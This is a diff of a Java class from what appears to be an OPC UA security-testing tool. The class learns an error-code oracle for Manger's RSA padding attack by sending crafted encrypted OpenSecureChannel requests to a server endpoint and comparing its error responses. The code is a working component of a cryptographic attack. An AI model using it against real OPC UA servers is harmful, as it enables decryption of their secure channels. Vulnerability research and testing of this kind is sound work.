@@ -1,123 +1,101 @@
 package attacks.manger.oracle.learner;
 
-import attacks.CipherTextHelper;
+import attacks.manger.MangerUtility;
 import attacks.manger.oracle.DistinguishableErrorOracle;
+import attacks.manger.oracle.Oracle;
 import attacks.manger.oracle.OracleException;
-import opcua.context.Context;
+import attacks.manger.oracle.VictimProxy;
+import opcua.context.Endpoint;
+import opcua.context.LocalKeyPair;
+import opcua.encoding.EncodingException;
 import opcua.message.ErrorMessage;
-import opcua.message.HelloMessage;
-import opcua.message.Message;
-import opcua.message.parts.MessageType;
-import opcua.util.MessageReceiver;
-import opcua.util.MessageSender;
-import transport.tcp.ClientTcpConnection;
+import opcua.message.OpenSecureChannelRequest;
+import reporting.entry.Entry;
+import reporting.entry.Group;
+import reporting.entry.ValueEntry;
+import transport.SecureChannelUtil;
+import transport.TransportContext;
+import transport.TransportException;
+import transport.tcp.TcpClientUtil;
 
 import java.io.IOException;
-import java.security.SecureRandom;
-import java.security.interfaces.RSAPublicKey;
-import java.util.Arrays;
-import java.util.HashMap;
-import java.util.Map;
 
-public class ErrorCodeOracleLearner extends OracleLearner {
+/**
+ * Learner that tries to construct an oracle for Manger's attack, which distinguishes different error codes.
+ */
 
-    private final Context context;
-    private final byte[] validCipherText;
+public class ErrorCodeOracleLearner implements OracleLearner {
 
+    private final int numberOfVerifications;
+    private final LocalKeyPair localKeyPair;
 
-    public ErrorCodeOracleLearner(Context context, byte[] validCipherText) {
-        this.context = context;
-        this.validCipherText = validCipherText;
+    /**
+     * Constructor
+     * @param localKeyPair Certificate and private key to use for queries
+     * @param numberOfVerifications How often to verify, if an error code was not returned by chance
+     */
+    public ErrorCodeOracleLearner(LocalKeyPair localKeyPair, int numberOfVerifications) {
+        this.localKeyPair = localKeyPair;
+        this.numberOfVerifications = numberOfVerifications;
     }
 
+    /**
+     * Constructor that will create a new self-signed certificate for queries
+     * @param numberOfVerifications How often to verify, if an error code was not returned by chance
+     */
+    public ErrorCodeOracleLearner(int numberOfVerifications) {
+        this.numberOfVerifications = numberOfVerifications;
+        this.localKeyPair = LocalKeyPair.generateSelfSigned(2048, "CN:OpcUa-Attacker");
+    }
+
+    /**
+     * Tries to learn an error code oracle for Manger's attack for a specific endpoint
+     * @param endpoint Endpoint to test
+     * @return The result of the learning, including the oracle, if successful
+     * @throws OracleException if security configuration of endpoint does not allow for Manger's attack
+     */
     @Override
-    public LearningResult learn(int rounds) throws OracleException {
-        byte[] cipherText = Arrays.copyOf(validCipherText, validCipherText.length);
-        int cipherBlockLength = ((RSAPublicKey) context.getRemoteCertificate().getPublicKey()).getModulus().bitLength() / 8;
-        int blockOffset;
+    public LearningResult learn(Endpoint endpoint) throws OracleException {
+        MangerUtility.throwIfSecurityConfigurationUnsupported(endpoint);
+
         try {
-            blockOffset = CipherTextHelper.getOpnBlockOffset(cipherText, (RSAPublicKey) context.getRemoteCertificate().getPublicKey());
-        } catch (IOException e) {
-            throw new OracleException("Unable to compute block offset", e);
-        }
-        byte[] randomCipherBlock = new byte[cipherBlockLength];
-        SecureRandom secureRandom = new SecureRandom();
+            byte[] validCipherText = SecureChannelUtil.generateEncryptedOpnRequest(endpoint, localKeyPair);
+            VictimProxy victimProxy = new VictimProxy(endpoint, validCipherText);
 
-        //We save the number of responses with each individual error code in a map
-        Map<Long, Integer> errorCodeFrequencies = new HashMap<>();
-
-        for(int i = 0; i < rounds; i++) {
-            //Insert a random cipher block into the valid cipher text
-            secureRandom.nextBytes(randomCipherBlock);
-            CipherTextHelper.insertCipherBlock(cipherText, randomCipherBlock, blockOffset, cipherBlockLength, 0);
-
-            //Send resulting cipher text to server and evaluate output
-            ClientTcpConnection connection = new ClientTcpConnection(context.getRemoteHostname(), context.getRemotePort(), 3000);
-            context.setConnection(connection);
-            try {
-                connection.initialize();
-                MessageSender.sendMessage(new HelloMessage(0, 8192, 8192, 8192, 256, context.getEndpointUrl()), context);
-                Message ack = MessageReceiver.receiveMessage(context);
-                if(ack == null || ack.getMessageType() != MessageType.ACK) {
-                    throw new OracleException("Unable to establish TCP connection");
-                }
-
-                MessageSender.sendBytes(cipherText, context);
-                Message response = MessageReceiver.receiveMessage(context);
-
-                if(response != null && response.getMessageType() == MessageType.ERR) {
-                    ErrorMessage error = (ErrorMessage)response;
-                    long errorCode = error.getError();
-                    //Update frequencies
-                    if(!errorCodeFrequencies.containsKey(errorCode)) {
-                        errorCodeFrequencies.put(errorCode, 0);
-                    }
-                    errorCodeFrequencies.replace(errorCode, errorCodeFrequencies.get(errorCode) + 1);
-                }
-
-                connection.close();
-            }
-            catch (IOException e) {
-                throw new OracleException(e);
-            }
-        }
-
-        //Find the the two most frequent error codes
-        Map.Entry<Long, Integer> most = null, secondMost = null;
-        for(Map.Entry<Long, Integer> entry : errorCodeFrequencies.entrySet()) {
-            if(most == null || entry.getValue() > most.getValue()) {
-                secondMost = most;
-                most = entry;
-            } else {
-                if(secondMost == null || entry.getValue() > secondMost.getValue()) {
-                    secondMost = entry;
+            long errorCodeLessB = ((ErrorMessage)victimProxy.sendEncryptedPlainBlock(MangerUtility.generatePlaintextLessB(endpoint.getPublicKey())).getResponse()).getError();
+            for (int i=0; i<numberOfVerifications; i++) {
+                if(((ErrorMessage)victimProxy.sendEncryptedPlainBlock(MangerUtility.generatePlaintextLessB(endpoint.getPublicKey())).getResponse()).getError() != errorCodeLessB) {
+                    return createFailureResult("Server responded with multiple error codes for \"<B\"");
                 }
             }
+
+            long errorCodeGeqB = ((ErrorMessage)victimProxy.sendEncryptedPlainBlock(MangerUtility.generatePlaintextGeqB(endpoint.getPublicKey())).getResponse()).getError();
+            if (errorCodeLessB == errorCodeGeqB) {
+                return createFailureResult("Server responded with equal error codes for \"<B\" and \">=B\" (\"" + Long.toHexString(errorCodeLessB) + "\")");
+            }
+            for (int i=0; i<numberOfVerifications; i++) {
+                if(((ErrorMessage)victimProxy.sendEncryptedPlainBlock(MangerUtility.generatePlaintextGeqB(endpoint.getPublicKey())).getResponse()).getError() != errorCodeGeqB) {
+                    return createFailureResult("Server responded with error codes for \">=B\"");
+                }
+            }
+
+            Oracle oracle = new DistinguishableErrorOracle(endpoint, (ErrorMessage e) -> e.getError() == errorCodeLessB, validCipherText);
+            Entry report = new Group("ErrorCodeOracleLearner")
+                    .addSubEntry(new ValueEntry<>("Successful", true))
+                    .addSubEntry(new ValueEntry<>("Error Code for \"<B\"", errorCodeLessB))
+                    .addSubEntry(new ValueEntry<>("Error Code for \">=B\"", errorCodeGeqB));
+
+            return new LearningResult(oracle, report);
         }
-
-        if(most == null || secondMost == null) {
-            throw new OracleException("Unable to learn oracle");
+        catch (EncodingException | IOException e) {
+            throw new OracleException(e);
         }
+    }
 
-        //Calculate confidence level
-        double deviation1 = Math.abs(((double)most.getValue() / rounds) - (255.0/256));
-        double deviation2 = Math.abs(((double)secondMost.getValue() / rounds) - (1.0/256));
-        double confidence = 1 - ((deviation1 + deviation2) / 2);
-
-        //Build oracle
-        Map.Entry<Long, Integer> errorCodeLessThanB = secondMost;
-        try {
-            DistinguishableErrorOracle oracle = new DistinguishableErrorOracle(
-                    context,
-                    (ErrorMessage msg) -> msg.getError() == errorCodeLessThanB.getKey(),
-                    validCipherText,
-                    0
-            ); //TODO: BLock number
-
-            return new LearningResult(oracle, confidence);
-
-        } catch (IOException e) {
-            throw new OracleException("Unable to build oracle", e);
-        }
+    private static LearningResult createFailureResult(String reason) {
+        Entry report = new Group("ErrorCodeOracleLearner")
+                .addSubEntry(new ValueEntry<>("Successful", false))
+                .addSubEntry(new ValueEntry<>("Reason", reason));
+        return new LearningResult(report);
     }
 }
